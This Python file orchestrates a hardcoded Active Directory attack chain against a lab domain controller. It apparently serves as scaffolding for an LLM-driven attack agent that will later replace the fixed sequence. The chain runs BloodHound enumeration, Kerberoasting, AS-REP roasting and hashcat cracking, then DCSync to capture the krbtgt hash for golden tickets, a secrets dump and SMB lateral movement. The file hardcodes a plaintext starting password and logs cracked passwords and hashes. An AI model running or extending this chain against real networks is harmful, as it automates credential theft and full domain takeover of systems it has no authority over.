# aev/runner_hardcoded.py
"""
Hardcoded sequential attack chain — no LLM.
Purpose: validate tool chaining + logging works end-to-end.
Swap with the LLM agent once this runs clean.
"""
import json
import time
import logging
import tempfile
import os
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Any, Optional

# Import your actual wrappers with correct function names
from aev.tools.enum_bloodhound import run_bloodhound
from aev.tools.kerberoast import run_kerberoast
from aev.tools.asrep_roast import run_asrep_roast
from aev.tools.secrets_dump import run_secrets_dump
from aev.tools.dcsync import run_dcsync
from aev.tools.lateral_movement import run_lateral_movement
from aev.tools.hashcat import submit_to_hashcat, check_cracked, cancel_job

# ── Config ────────────────────────────────────────────────────────────────────
TARGET_DC    = "192.168.56.10"    # your VM IP
DOMAIN       = "coficab.lab"       # your AD domain
USERNAME     = "aymen"          # starting cred
PASSWORD     = "P@ssw0rd2026!"
HASH         = None               # set after secrets_dump if PTH is needed
RUN_ID       = datetime.now().strftime("%Y%m%d_%H%M%S")
LOG_DIR      = Path("runs") / RUN_ID
LOG_DIR.mkdir(parents=True, exist_ok=True)
JSONL_LOG    = LOG_DIR / "run.jsonl"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(LOG_DIR / "runner.log"),
        logging.StreamHandler(),
    ]
)
log = logging.getLogger(__name__)

# ── Logger ────────────────────────────────────────────────────────────────────
def log_result(result: Dict[str, Any], step: int, decision_rationale: str = "hardcoded"):
    """Append one structured event to the JSONL run log."""
    # Determine success status from the result dict
    status = result.get("status", "unknown")
    success = status not in ["error", "timeout"]
    
    # Build a clean event dict
    event = {
        "step": step,
        "decision_rationale": decision_rationale,
        "technique_id": result.get("technique_id"),
        "technique_name": result.get("technique_name"),
        "tool": result.get("tool"),
        "status": status,
        "success": success,
        "summary": result.get("summary"),
        "data": result.get("data"),
        "error": result.get("error"),
        "duration_seconds": result.get("duration_seconds"),
    }
    
    with open(JSONL_LOG, "a") as f:
        f.write(json.dumps(event) + "\n")
    
    log.info(f"Step {step} | {result.get('technique_name', 'unknown')} | {'OK' if success else 'FAIL'}")


def get_cracked_passwords(session: str, max_wait: int = 300, poll_interval: int = 10) -> Optional[List[Dict]]:
    """
    Poll hashcat job until it completes or times out.
    Returns list of cracked credentials or None if failed.
    """
    elapsed = 0
    while elapsed < max_wait:
        check_result = check_cracked(session)
        status = check_result.get("status")
        
        if status == "cracked":
            log.info(f"Hashcat cracked {len(check_result['data']['cracked'])} passwords")
            return check_result["data"]["cracked"]
        elif status == "exhausted":
            log.info("Hashcat exhausted wordlist without cracking")
            return []
        elif status == "error":
            log.error(f"Hashcat error: {check_result.get('error')}")
            return None
        
        # Still running - show progress
        progress = check_result.get("data", {}).get("progress", {})
        if progress and progress.get("progress_pct"):
            log.info(f"Hashcat progress: {progress['progress_pct']}%")
        
        time.sleep(poll_interval)
        elapsed += poll_interval
    
    # Timeout - cancel the job
    log.warning(f"Hashcat job {session} timed out after {max_wait}s - cancelling")
    cancel_job(session)
    return None


# ── Hardcoded chain ───────────────────────────────────────────────────────────
def run_chain():
    log.info(f"=== AEV Hardcoded Run: {RUN_ID} ===")
    
    # Static step numbers - always consistent across runs
    STEP_BLOODHOUND = 1
    STEP_KERBEROAST = 2
    STEP_ASREP = 3
    STEP_HASHCAT = 4
    STEP_DCSYNC = 5
    STEP_SECRETSDUMP = 6
    STEP_LATERAL = 7
    
    state = {
        "domain": DOMAIN,
        "dc_ip": TARGET_DC,
        "users": [],              # from BloodHound (admincount users)
        "da_members": [],         # from BloodHound (Domain Admin members)
        "kerberoastable_users": [], # from BloodHound
        "hashes": [],            # collected hashes for cracking
        "credentials": {},       # username -> password mapping
        "admin_credentials": {}, # admin-level credentials (key = full username with domain)
    }

    # ── 1. BloodHound Enumeration ──────────────────────────────────────────
    log.info("Step 1: Running BloodHound enumeration...")
    t0 = time.time()
    result = run_bloodhound(
        domain=DOMAIN,
        username=USERNAME,
        password=PASSWORD,
        dc_ip=TARGET_DC,
        timeout=600
    )
    result["duration_seconds"] = time.time() - t0
    log_result(result, STEP_BLOODHOUND)
    
    if result.get("status") == "success" and result.get("data"):
        bh_data = result["data"]
        state["users"] = bh_data.get("admincount_users", [])
        state["kerberoastable_users"] = bh_data.get("kerberoastable_users", [])
        # Also pull DA members directly as fallback
        state["da_members"] = bh_data.get("domain_admin_members", [])
        log.info(f"Found {len(state['users'])} admin users, {len(state['kerberoastable_users'])} kerberoastable users")

    # ── 2. Kerberoasting ────────────────────────────────────────────────────
    log.info("Step 2: Running Kerberoasting...")
    t0 = time.time()
    result = run_kerberoast(
        domain=DOMAIN,
        username=USERNAME,
        password=PASSWORD,
        dc_ip=TARGET_DC,
        timeout=120
    )
    result["duration_seconds"] = time.time() - t0
    log_result(result, STEP_KERBEROAST)
    
    if result.get("status") == "success" and result.get("data"):
        hashes = result["data"].get("hashes", [])
        if hashes:
            state["hashes"].extend([h["hash"] for h in hashes])
            log.info(f"Captured {len(hashes)} Kerberoast hashes")
        else:
            log.info("No Kerberoast hashes captured")

    # ── 3. AS-REP Roasting ──────────────────────────────────────────────────
    log.info("Step 3: Running AS-REP Roasting...")
    
    # Need a users_file for unauthenticated AS-REP roasting
    # Use the users we found from BloodHound, or provide a default list
    users_to_test = state["users"] if state["users"] else ["Administrator", "krbtgt", "Guest"]
    
    users_file = None
    try:
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as f:
            f.write("\n".join(users_to_test))
            users_file = f.name
        
        t0 = time.time()
        result = run_asrep_roast(
            domain=DOMAIN,
            dc_ip=TARGET_DC,
            users_file=users_file,
            timeout=120
        )
        result["duration_seconds"] = time.time() - t0
        log_result(result, STEP_ASREP)
        
        if result.get("status") == "success" and result.get("data"):
            hashes = result["data"].get("hashes", [])
            if hashes:
                state["hashes"].extend([h["hash"] for h in hashes])
                log.info(f"Captured {len(hashes)} AS-REP hashes")
            else:
                log.info("No AS-REP vulnerable accounts found")
    finally:
        # Clean up temp file
        if users_file and os.path.exists(users_file):
            os.unlink(users_file)

    # ── 4. Hashcat Cracking (if we have hashes) ────────────────────────────
    if state["hashes"]:
        log.info(f"Step 4: Submitting {len(state['hashes'])} hashes to Hashcat...")
        
        # Determine hash mode - try Kerberos first (13100), fall back to AS-REP (18200)
        hash_mode = 13100  # Default to Kerberos TGS-REP
        
        t0 = time.time()
        submit_result = submit_to_hashcat(
            hashes=state["hashes"],
            mode=hash_mode,
            wordlist="/usr/share/wordlists/rockyou.txt",  # Adjust path as needed
            attack_mode=0,  # Straight wordlist
            session=None  # Auto-generate session name
        )
        submit_result["duration_seconds"] = time.time() - t0
        log_result(submit_result, STEP_HASHCAT)
        
        if submit_result.get("status") == "submitted":
            session = submit_result["data"]["session"]
            log.info(f"Hashcat job submitted: {session}")
            
            # Poll for completion
            cracked = get_cracked_passwords(session, max_wait=300, poll_interval=10)
            
            if cracked:
                # Store cracked credentials
                for cred in cracked:
                    account = cred.get("account", "unknown")
                    password = cred.get("plaintext", "")
                    if account and password:
                        state["credentials"][account] = password
                        log.info(f"Cracked {account}: {password}")
                
                # Check both admincount_users AND da_members
                all_admin_users = set(state["users"]) | set(state.get("da_members", []))
                admin_accounts = [
                    u for u in all_admin_users
                    if u.split("@")[0].lower() in [c.lower() for c in state["credentials"]]
                ]
                
                if admin_accounts:
                    log.info(f"Found admin credentials: {admin_accounts}")
                    for admin in admin_accounts:
                        # Find the matching key in credentials regardless of case
                        admin_short = admin.split("@")[0].lower()
                        matched_key = next(k for k in state["credentials"] if k.lower() == admin_short)
                        # Store with the full admin username (with domain) as the key
                        state["admin_credentials"][admin] = state["credentials"][matched_key]
                        
        else:
            log.warning(f"Hashcat submission failed: {submit_result.get('error')}")
    else:
        # Log skipped step
        skip_result = {
            "status": "skipped",
            "technique_id": "T1110.002",
            "technique_name": "Password Cracking",
            "tool": "hashcat",
            "summary": "No hashes to crack - skipping Hashcat",
            "data": None,
            "error": None,
        }
        log_result(skip_result, STEP_HASHCAT)
        log.info("No hashes to crack - skipping Hashcat")

    # ── 5. DCSync (if we have admin credentials) ────────────────────────────
    if state["admin_credentials"]:
        log.info("Step 5: Running DCSync with admin credentials...")
        
        # Get the full admin username (with domain) and extract the username part
        admin_user_full = next(iter(state["admin_credentials"]))
        admin_pass = state["admin_credentials"][admin_user_full]
        admin_user = admin_user_full.split("@")[0].lower()
        
        log.info(f"Attempting DCSync with {admin_user} (from {admin_user_full})")
        
        t0 = time.time()
        result = run_dcsync(
            domain=DOMAIN,
            username=admin_user,
            dc_ip=TARGET_DC,
            password=admin_pass,
            timeout=300
        )
        result["duration_seconds"] = time.time() - t0
        log_result(result, STEP_DCSYNC)
        
        if result.get("status") == "success" and result.get("data"):
            data = result["data"]
            if data.get("golden_ticket_ready"):
                log.info("Golden ticket ready! krbtgt hash captured")
                krbtgt = data.get("krbtgt", {})
                if krbtgt:
                    log.info(f"krbtgt NT hash: {krbtgt.get('nt_hash')}")
    else:
        # Log skipped step - removed the problematic fallback DCSync attempt
        skip_result = {
            "status": "skipped",
            "technique_id": "T1003.006",
            "technique_name": "DCSync",
            "tool": "dcsync",
            "summary": "No admin credentials available - skipping DCSync",
            "data": None,
            "error": None,
        }
        log_result(skip_result, STEP_DCSYNC)
        log.info("No admin credentials available - skipping DCSync")

    # ── 6. Secrets Dump (alternative credential dump) ──────────────────────
    # Try with any credentials we have (admin or regular)
    if state["credentials"] or (USERNAME and PASSWORD):
        log.info("Step 6: Running Secrets Dump...")
        
        # Prefer admin credentials, fall back to initial creds
        if state["admin_credentials"]:
            cred_user_full = next(iter(state["admin_credentials"]))
            cred_pass = state["admin_credentials"][cred_user_full]
            # Extract the username part (before @) if it contains @
            cred_user = cred_user_full.split("@")[0].lower()
            cred_hash = None
            log.info(f"Using admin credentials: {cred_user}")
        else:
            cred_user = USERNAME
            cred_pass = PASSWORD
            cred_hash = None
        
        t0 = time.time()
        result = run_secrets_dump(
            domain=DOMAIN,
            username=cred_user,
            target_ip=TARGET_DC,
            password=cred_pass,
            hashes=cred_hash,
            timeout=120
        )
        result["duration_seconds"] = time.time() - t0
        log_result(result, STEP_SECRETSDUMP)
        
        if result.get("status") == "success" and result.get("data"):
            data = result["data"]
            hv = data.get("high_value_accounts", [])
            if hv:
                log.info(f"Captured high-value account hashes: {[h['username'] for h in hv]}")
                # Store hashes for potential later use
                state["hashes"].extend([h["nt_hash"] for h in hv if h.get("nt_hash")])
    else:
        skip_result = {
            "status": "skipped",
            "technique_id": "T1003",
            "technique_name": "Credential Dumping",
            "tool": "secretsdump",
            "summary": "No credentials available - skipping Secrets Dump",
            "data": None,
            "error": None,
        }
        log_result(skip_result, STEP_SECRETSDUMP)
        log.info("No credentials available - skipping Secrets Dump")

    # ── 7. Lateral Movement ──────────────────────────────────────────────────
    log.info("Step 7: Testing Lateral Movement...")
    
    # Try with any credentials we have
    if state["admin_credentials"]:
        cred_user_full = next(iter(state["admin_credentials"]))
        cred_pass = state["admin_credentials"][cred_user_full]
        # Extract the username part (before @) if it contains @
        cred_user = cred_user_full.split("@")[0].lower()
        log.info(f"Using admin credentials for lateral movement: {cred_user}")
    elif state["credentials"]:
        cred_user = next(iter(state["credentials"]))
        cred_pass = state["credentials"][cred_user]
        log.info(f"Using cracked credentials for lateral movement: {cred_user}")
    else:
        cred_user = USERNAME
        cred_pass = PASSWORD
        log.info(f"Using initial credentials for lateral movement: {cred_user}")
    
    t0 = time.time()
    result = run_lateral_movement(
        target_ip=TARGET_DC,
        username=cred_user,
        password=cred_pass,
        nt_hash=None,
        command="whoami /all",
        method="smb",
        domain=DOMAIN,
        timeout=60
    )
    result["duration_seconds"] = time.time() - t0
    log_result(result, STEP_LATERAL)
    
    if result.get("status") == "success" and result.get("data"):
        data = result["data"]
        if data.get("local_admin"):
            log.info("Local admin access confirmed!")
            if data.get("command_output"):
                log.info(f"Command output: {data['command_output'][:200]}...")
        else:
            log.info("Authenticated but no local admin access")
    else:
        log.info("Lateral movement failed")

    # ── Final Summary ────────────────────────────────────────────────────────
    log.info("=" * 60)
    log.info("=== RUN COMPLETE ===")
    log.info("Step numbering: 1=BloodHound, 2=Kerberoast, 3=AS-REP, 4=Hashcat, 5=DCSync, 6=SecretsDump, 7=Lateral")
    log.info(f"Credentials cracked: {len(state['credentials'])}")
    log.info(f"Admin credentials: {len(state['admin_credentials'])}")
    log.info(f"Hashes collected: {len(state['hashes'])}")
    log.info(f"Log file: {JSONL_LOG}")
    log.info("=" * 60)
    
    return state


if __name__ == "__main__":
    try:
        final_state = run_chain()
    except KeyboardInterrupt:
        log.warning("Runner interrupted by user")
    except Exception as e:
        log.error(f"Runner failed with exception: {e}", exc_info=True)